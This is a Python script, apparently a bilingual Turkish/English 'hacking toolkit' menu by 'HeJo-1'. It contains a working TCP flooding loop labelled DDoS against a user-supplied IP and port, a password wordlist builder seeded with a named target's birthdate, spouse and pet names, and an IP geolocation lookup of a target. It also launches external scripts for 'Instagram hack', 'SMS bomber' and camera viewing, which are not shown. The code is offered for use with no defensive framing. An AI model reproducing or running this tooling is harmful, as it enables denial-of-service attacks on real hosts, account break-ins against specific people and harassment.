import requests
import itertools
import os
import time as t
import socket
from cryptography.fernet import Fernet
import subprocess
def tr():
    def ipdef():
        print('''

    _____         ____  _ _       _ _           _ 
   |_   _|       |  _ \(_) |     (_) |         (_)
     | |  _ __   | |_) |_| | __ _ _| | ___ _ __ _ 
     | | | '_ \  |  _ <| | |/ _` | | |/ _ \ '__| |
    _| |_| |_) | | |_) | | | (_| | | |  __/ |  | |
   |_____| .__/  |____/|_|_|\__, |_|_|\___|_|  |_|
         | |                 __/ |                
         |_|                |___/                 

            
            Made By HeJo-1
            
    ''')
        t.sleep(5)
        def check(): #!Eğerki site çevrimdışı değilse sıkıntı çıkmasın diye serverın online olup olmadığını kontrol edeceğimiz bir fonksiyon belirliyoruz.
            r = requests.get("https://ipinfo.io/") #! Veri çekeceğimiz siteye get isteği atıyoruz.
            if r.status_code == 200: #! Eğerki dönen response(cevap) kodu 200 olur ise bunları yap diyen bir if kontrolü yazıyoruz.
                print("\n[+] Sunucu Çevrimiçi!\n") #! İf kontrolü olumlu olursa bu mesajı yazdırıyoruz.
            else: #! Tam dersi durumunda ise aşağıdaki kodları uygula diyoruz.
                print("\n[!] Sunucu Çevrimdışı!\n") #! İf kontrolü olumsuz ise çevrimdışı yazdırıyoruz.
                exit() #! Çıkış yapıyoruz
        def get_device_name(ip):
            try:
                host_name = socket.gethostbyaddr(ip)
                return host_name[0]
            except socket.herror:
                return "Belirtilen IP adresi geçersiz veya cihaz adı bulunamadı."
        ip = input("Lütfen hedef ip giriniz: ") #! Kullanıcıdan ip adresini istiyoruz.
        check() #! Web site kontrol fonksiyonumuzu çağırıyoruz.
        country = requests.get("https://ipinfo.io/{}/country/".format(ip)).text #! {} kullanarak ip adresini yazdırıp hedeften .text fonksiyonu ile yazıyı çekiyoruz.
        city = requests.get("https://ipinfo.io/{}/city/".format(ip)).text #! Aynı işlemleri uyguluyoruz.
        region = requests.get("https://ipinfo.io/{}/region/".format(ip)).text
        postal = requests.get("https://ipinfo.io/{}/postal/".format(ip)).text
        timezone = requests.get("https://ipinfo.io/{}/timezone/".format(ip)).text
        orgination = requests.get("https://ipinfo.io/{}/org/".format(ip)).text
        location =  requests.get("https://ipinfo.io/{}/loc/".format(ip)).text
        device_name = get_device_name(ip)
        #! Alt tarafta ise verileri yazdırıyoruz.
        print("İp: "+ip)
        print("Ülke: "+country)
        print("Şehir: "+city)
        print("Bölge: "+region)
        print("Posta Kodu: "+postal)
        print("Zaman Dilimi: "+timezone)
        print("Organizasyon: "+orgination)
        print("Lokasyon: "+location)
        print("Cihaz Adı: "+ device_name)
    def sifredef():

        print('''
            
          _____ _  __                  _           _                               
         / ____(_)/ _|                | |         | |                              
        | (___  _| |_ _ __ ___    ___ | |_   _ ___| |_ _   _ _ __ _   _  ___ _   _ 
        \___ \| |  _| '__/ _ \  / _ \| | | | / __| __| | | | '__| | | |/ __| | | |
        ____) | | | | | |  __/ | (_) | | |_| \__ | |_| |_| | |  | |_| | (__| |_| |
       |_____/|_|_| |_|  \___|  \___/|_|\__,_|___/\__|\__,_|_|   \__,_|\___|\__,_|
                                                                                    
            Made By HeJo-1
                                                                                    
        ''')
        t.sleep(5)

        def generate_passwords(user_info, include_numbers=False):
            # Generate passwords using combinations of user information
            for r in range(1, len(user_info) + 1):
                for combination in itertools.permutations(user_info, r):
                    password = ''.join(combination)
                    yield password

                    # Include number combinations if specified
                    if include_numbers:
                        for number in range(10):
                            password_with_number = password + str(number)
                            yield password_with_number

        def save_passwords(passwords, output_file):
            with open(output_file, 'w', encoding='utf-8') as file:
                for password in passwords:
                    file.write(password + '\n')

        # The rest of your code remains unchanged
        name = input("Hedef kişinin adı: ")
        surname = input("Hedef kişinin soyadı: ")
        birth_year = input("Hedef kişinin doğduğu yıl: ")
        birth_month = input("Hedef kişinin doğduğu ay: ")
        birth_day = input("Hedef kişinin doğduğu gün: ")
        spouse_name = input("Hedef kişinin eşinin adı: ")
        spouse_surname = input("Hedef kişinin eşinin soyadı: ")
        pet_name = input("Hedef kişinin evcil hayvanının adı: ")
        hometown = input("Hedef kişinin memleketi: ")
        homeplak = input("Hedef kişinin memleketinin plaka kodu: ")
        onm = input("Hedef kişinin önem verdiği bir kelime: ")
        # Ask the user if they want to include number combinations
        include_numbers_input = input("Sayı kombinasyonlarını eklemek ister misiniz? (Evet/Hayır): ")
        include_numbers = include_numbers_input.lower() == 'evet'

        # Combine user information into a list
        user_info = [name, surname, birth_year, birth_month, birth_day, spouse_name, spouse_surname, pet_name, hometown, homeplak, onm]
        # Generate passwords (as a generator)
        passwords = generate_passwords(user_info, include_numbers)
        # Save passwords to a text file
        output_file = "wordlist.txt"
        save_passwords(passwords, output_file)

        print(f'Şifreler {output_file} kayıt edildi.')


    def ddosdef():
        print('''
        _____  _____        _____ 
        |  __ \|  __ \      / ____|
        | |  | | |  | | ___| (___  
        | |  | | |  | |/ _ \\___ \ 
        | |__| | |__| | (_) |___) |
        |_____/|_____/ \___/_____/ 

            Made By HeJo-1
                                                                                        
        ''')
        t.sleep(5)

        # Kullanıcıdan IP adresini alın
        ip = input("Hedef IP adresini girin: ")

        # Kullanıcıdan port numarasını, mesaj boyutunu (byte cinsinden) ve gönderim aralığını (saniye cinsinden) alın
        port = int(input("Port numarasını girin: "))
        msg_size = int(input("Mesaj boyutunu (KB cinsinden) girin: ")) * 1024
        interval = float(input("Gönderim aralığını (saniye cinsinden) girin: "))

        total_sent = 0   # Toplam gönderilen veri miktarını takip etmek için değişken tanımlayın

        while True:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                try:
                    s.connect((ip, port))

                    data = b'A' * msg_size     # Create a large string containing 'A's
                    start_time = t.time()   # Start timer
                    while ((t.time() - start_time) < interval):
                        sent = s.sendall(data)      # Send packets continuously until the specified interval has elapsed
                        total_sent += sent          # Gönderilen veri miktarını toplam gönderilen veriyle güncelle
                except Exception as e:
                    print("Hata:", str(e))
            
            # Gönderilen veri miktarını ekrana yazdır
            print("Toplam gönderilen veri miktarı:", total_sent)
    def dosyasifrelemedef():
        print('''

    _____                        
    |  __ \                       
    | |  | | ___  ___ _   _  __ _ 
    | |  | |/ _ \/ __| | | |/ _` |
    | |__| | (_) \__ \ |_| | (_| |
    |_____/ \___/|___/\__, |\__,_|
                       __/ |      
                      |___/       

            Made By HeJo-1

    ''')

        def anahtar_olustur():
            anahtar = Fernet.generate_key()
            with open("anahtar.key", "wb") as dosya:
                dosya.write(anahtar)

        def anahtar_yukle():
            with open("anahtar.key", "rb") as dosya:
                anahtar = dosya.read()
            return anahtar

        def dosya_sifrele(dosya_adi, anahtar):
            fernet = Fernet(anahtar)
            with open(dosya_adi, 'rb') as dosya:
                veri = dosya.read()
            sifreli_veri = fernet.encrypt(veri)
            with open(dosya_adi, 'wb') as dosya:
                dosya.write(sifreli_veri)

        def dosya_sifresini_ac(dosya_adi, anahtar):
            fernet = Fernet(anahtar)
            with open(dosya_adi, 'rb') as dosya:
                sifreli_veri = dosya.read()
            cozulmus_veri = fernet.decrypt(sifreli_veri)
            with open(dosya_adi, 'wb') as dosya:
                dosya.write(cozulmus_veri)

        # Kullanıcıdan şifrelemek veya şifresini açmak istediği dosyanın adını ve yolu alalım
        dosya_yolu = input("Dosyanın adını ve yolunu girin: ")

        # Kullanıcıdan yapmak istediği işlemi alalım (şifreleme veya şifresini açma)
        islem = input("İşlemi seçin (sifrele / ac): ")

        if islem == "sifrele":
            # Anahtar oluştur
            anahtar_olustur()
            # Anahtarı yükle
            anahtar = anahtar_yukle()
            # Dosyayı şifrele
            dosya_sifrele(dosya_yolu, anahtar)
            print("Dosya başarıyla şifrelendi.")

        elif islem == "ac":
            # Anahtarı yükle
            anahtar = anahtar_yukle()
            # Dosyanın şifresini aç
            dosya_sifresini_ac(dosya_yolu, anahtar)
            print("Dosya başarıyla çözüldü.")

        else:
            print("Geçersiz işlem seçildi.")
    print('''

     _    _           _                _    _ _______ 
    | |  | |         | |              | |  | |__   __|
    | |__| | ___     | | ___          | |__| |  | |   
    |  __  |/ _ \_   | |/ _ \         |  __  |  | |   
    | |  | |  __/ |__| | (_) |        | |  | |  | |   
    |_|  |_|\___|\____/ \___/         |_|  |_|  |_|   

        Made By HeJo-1                                      
        [1] İp Bilgilendirici
        [2] Wordlist/Şifre Oluşturucu
        [3] DDos
        [4] Dosya şifreleme
        [5] İnstagram sızma
        [6] sms patlamasi
        [7] Kayıtlı kameralar
        [99] Çıkış
    ''')
    while True:
        b=int(input(""))
        if b == 1:
            ipdef()
        elif b == 2:
            sifredef()
        elif b == 3:
            ddosdef()
        elif b == 4:
            dosyasifrelemedef()
        elif b == 5:
            subprocess.run(["python", "stc.py"])
        elif b == 6:
            subprocess.run(["python", "s.py"])
        elif b == 7:
            subprocess.run(["python", "cam.py"])
        elif b == 99:
            exit()
        else:
            print("Yanlış seçim! Lütfen tekrar deneyin.")

def eng():
        def ipdef():
            print('''


  _____         _____        __                           _   _             
 |_   _|       |_   _|      / _|                         | | (_)            
   | |  _ __     | |  _ __ | |_ ___  _ __ _ __ ___   __ _| |_ _  ___  _ __  
   | | | '_ \    | | | '_ \|  _/ _ \| '__| '_ ` _ \ / _` | __| |/ _ \| '_ \ 
  _| |_| |_) |  _| |_| | | | || (_) | |  | | | | | | (_| | |_| | (_) | | | |
 |_____| .__/  |_____|_| |_|_| \___/|_|  |_| |_| |_|\__,_|\__|_|\___/|_| |_|
       | |                                                                  
       |_|                                                                  

                
                Made By HeJo-1
                
        ''')
            t.sleep(5)
            def check(): #!Eğerki site çevrimdışı değilse sıkıntı çıkmasın diye serverın online olup olmadığını kontrol edeceğimiz bir fonksiyon belirliyoruz.
                r = requests.get("https://ipinfo.io/") #! Veri çekeceğimiz siteye get isteği atıyoruz.
                if r.status_code == 200: #! Eğerki dönen response(cevap) kodu 200 olur ise bunları yap diyen bir if kontrolü yazıyoruz.
                    print("\n[+] Server Online!\n") #! İf kontrolü olumlu olursa bu mesajı yazdırıyoruz.
                else: #! Tam dersi durumunda ise aşağıdaki kodları uygula diyoruz.
                    print("\n[!] Server Offline!\n") #! İf kontrolü olumsuz ise çevrimdışı yazdırıyoruz.
                    exit() #! Çıkış yapıyoruz
            def get_device_name(ip):
                try:
                    host_name = socket.gethostbyaddr(ip)
                    return host_name[0]
                except socket.herror:
                    return "The specified IP address is invalid or device name not found."
            ip = input("Please enter destination ip: ") #! Kullanıcıdan ip adresini istiyoruz.
            check() #! Web site kontrol fonksiyonumuzu çağırıyoruz.
            country = requests.get("https://ipinfo.io/{}/country/".format(ip)).text #! {} kullanarak ip adresini yazdırıp hedeften .text fonksiyonu ile yazıyı çekiyoruz.
            city = requests.get("https://ipinfo.io/{}/city/".format(ip)).text #! Aynı işlemleri uyguluyoruz.
            region = requests.get("https://ipinfo.io/{}/region/".format(ip)).text
            postal = requests.get("https://ipinfo.io/{}/postal/".format(ip)).text
            timezone = requests.get("https://ipinfo.io/{}/timezone/".format(ip)).text
            orgination = requests.get("https://ipinfo.io/{}/org/".format(ip)).text
            location =  requests.get("https://ipinfo.io/{}/loc/".format(ip)).text
            device_name = get_device_name(ip)
            #! Alt tarafta ise verileri yazdırıyoruz.
            print("İp: "+ip)
            print("Country: "+country)
            print("City: "+city)
            print("Region: "+region)
            print("Postal Code: "+postal)
            print("Time Zone: "+timezone)
            print("Organization: "+orgination)
            print("Location: "+location)
            print("Device Name: "+ device_name)
        def sifredef():

            print('''


  _____                                    _      _____                           _             
 |  __ \                                  | |    / ____|                         | |            
 | |__) |_ _ ___ _____      _____  _ __ __| |   | |  __  ___ _ __   ___ _ __ __ _| |_ ___  _ __ 
 |  ___/ _` / __/ __\ \ /\ / / _ \| '__/ _` |   | | |_ |/ _ \ '_ \ / _ \ '__/ _` | __/ _ \| '__|
 | |  | (_| \__ \__ \\ V  V / (_) | | | (_| |   | |__| |  __/ | | |  __/ | | (_| | || (_) | |   
 |_|   \__,_|___/___/ \_/\_/ \___/|_|  \__,_|    \_____|\___|_| |_|\___|_|  \__,_|\__\___/|_|   
                                                                                                
                                                                                                

                                                                          
                Made By HeJo-1
                                                                                        
            ''')
            t.sleep(5)
            def generate_passwords(user_info):
                password_list = []
                
                # Generate passwords using combinations of user information
                for r in range(1, len(user_info) + 1):
                    for combination in itertools.permutations(user_info, r):
                        password = ''.join(combination)
                        password_list.append(password)

                return password_list

            def save_passwords(passwords, output_file):
                with open(output_file, 'w', encoding='utf-8') as file:
                    for password in passwords:
                        file.write(password + '\n')


            # Gather user information
            name = input("Name of the target person: ")
            surname = input("Surname of the target person: ")
            birth_year = input("Year of birth of the target person: ")
            birth_month = input("Month of birth of the target person: ")
            birth_day = input("The day the target person was born: ")
            spouse_name = input("Name of the spouse of the target person: ")
            spouse_surname = input("Surname of the spouse of the target person: ")
            pet_name = input("Name of the target person's pet: ")
            hometown = input("The target's hometown: ")
            homeplak = input("License plate code of the target person's hometown: ")
            onm = input("A word that the target person cares about: ")

            # Combine user information into a list
            user_info = [name, surname, birth_year, birth_month, birth_day, spouse_name, spouse_surname, pet_name, hometown, homeplak, onm]
            # Generate passwords
            passwords = generate_passwords(user_info)
            # Save passwords to a text file
            output_file = "wordlist.txt"
            save_passwords(passwords, output_file)

            print(f'Passwords saved in {output_file}')

        def ddosdef():
            print('''
             _____  _____        _____ 
            |  __ \|  __ \      / ____|
            | |  | | |  | | ___| (___  
            | |  | | |  | |/ _ \\___ \ 
            | |__| | |__| | (_) |___) |
            |_____/|_____/ \___/_____/ 

                Made By HeJo-1
                                                                                            
            ''')
            t.sleep(5)

            # Kullanıcıdan IP adresini alın
            ip = input("Enter destination IP address: ")

            # Kullanıcıdan port numarasını, mesaj boyutunu (byte cinsinden) ve gönderim aralığını (saniye cinsinden) alın
            port = int(input("Enter the port number: "))
            msg_size = int(input("Enter the message size (in KB): ")) * 1024
            interval = float(input("Enter the transmission interval (in seconds): "))

            total_sent = 0   # Toplam gönderilen veri miktarını takip etmek için değişken tanımlayın

            while True:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    try:
                        s.connect((ip, port))

                        data = b'A' * msg_size     # Create a large string containing 'A's
                        start_time = t.time()   # Start timer
                        while ((t.time() - start_time) < interval):
                            sent = s.sendall(data)      # Send packets continuously until the specified interval has elapsed
                            total_sent += sent          # Gönderilen veri miktarını toplam gönderilen veriyle güncelle
                    except Exception as e:
                        print("Hata:", str(e))
                
                # Gönderilen veri miktarını ekrana yazdır
                print("TTotal amount of data sent:", total_sent)
        def dosyasifrelemedef():
            print('''

  ______ _ _       
 |  ____(_) |      
 | |__   _| | ___  
 |  __| | | |/ _ \ 
 | |    | | |  __/ 
 |_|    |_|_|\___| 
                   
                   
                Made By HeJo-1

        ''')

            def anahtar_olustur():
                anahtar = Fernet.generate_key()
                with open("anahtar.key", "wb") as dosya:
                    dosya.write(anahtar)

            def anahtar_yukle():
                with open("anahtar.key", "rb") as dosya:
                    anahtar = dosya.read()
                return anahtar

            def dosya_sifrele(dosya_adi, anahtar):
                fernet = Fernet(anahtar)
                with open(dosya_adi, 'rb') as dosya:
                    veri = dosya.read()
                sifreli_veri = fernet.encrypt(veri)
                with open(dosya_adi, 'wb') as dosya:
                    dosya.write(sifreli_veri)

            def dosya_sifresini_ac(dosya_adi, anahtar):
                fernet = Fernet(anahtar)
                with open(dosya_adi, 'rb') as dosya:
                    sifreli_veri = dosya.read()
                cozulmus_veri = fernet.decrypt(sifreli_veri)
                with open(dosya_adi, 'wb') as dosya:
                    dosya.write(cozulmus_veri)

            # Kullanıcıdan şifrelemek veya şifresini açmak istediği dosyanın adını ve yolu alalım
            dosya_yolu = input("Enter the name and path of the file: ")

            # Kullanıcıdan yapmak istediği işlemi alalım (şifreleme veya şifresini açma)
            islem = input("Select action (encrypt / decrypt): ")

            if islem == "encrypt":
                # Anahtar oluştur
                anahtar_olustur()
                # Anahtarı yükle
                anahtar = anahtar_yukle()
                # Dosyayı şifrele
                dosya_sifrele(dosya_yolu, anahtar)
                print("File encrypted successfully.")

            elif islem == "decrypt":
                # Anahtarı yükle
                anahtar = anahtar_yukle()
                # Dosyanın şifresini aç
                dosya_sifresini_ac(dosya_yolu, anahtar)
                print("File successfully solved.")

            else:
                print("Invalid transaction selected.")
        print('''

         _    _           _                _    _ _______ 
        | |  | |         | |              | |  | |__   __|
        | |__| | ___     | | ___          | |__| |  | |   
        |  __  |/ _ \_   | |/ _ \         |  __  |  | |   
        | |  | |  __/ |__| | (_) |        | |  | |  | |   
        |_|  |_|\___|\____/ \___/         |_|  |_|  |_|   

            Made By HeJo-1                                      
            [1] Ip Informative
            [2] Wordlist/Password Generator
            [3] DDos
            [4] File encryption
            [5] Instagram hack
            [6] Sms Boomber
            [7] See Camera
            [99] Exit
        ''')
        while True:
            a=int(input(""))
            if a == 1:
                ipdef()
            elif a == 2:
                sifredef()
            elif a == 3:
                ddosdef()
            elif a == 4:
                dosyasifrelemedef()
            elif a == 5:
                subprocess.run(["python", "stc.py"])
            elif a == 6:
                subprocess.run(["pytohn", "s.py"])
            elif a == 7:
                subprocess.run(["python", "cam.py"])
            elif a == 99:
                exit()
            else:
                print("Wrong choice! Please try again.")
while True:
    print('''

     _    _           _                  __ 
    | |  | |         | |                /_ |
    | |__| | ___     | | ___    ______   | |
    |  __  |/ _ \_   | |/ _ \  |______|  | |
    | |  | |  __/ |__| | (_) |           | |
    |_|  |_|\___|\____/ \___/            |_|
                                            
    Please Select Language / Lütfen Dil Seçin                                

        [1] English (US) - EN
        [2] Türkçe (TR) - TR
        [99] Exit
    ''')
    m = int(input(""))
    if m == 1:
        eng()
    elif m == 2:
        tr()
    elif m == 99:
        exit()
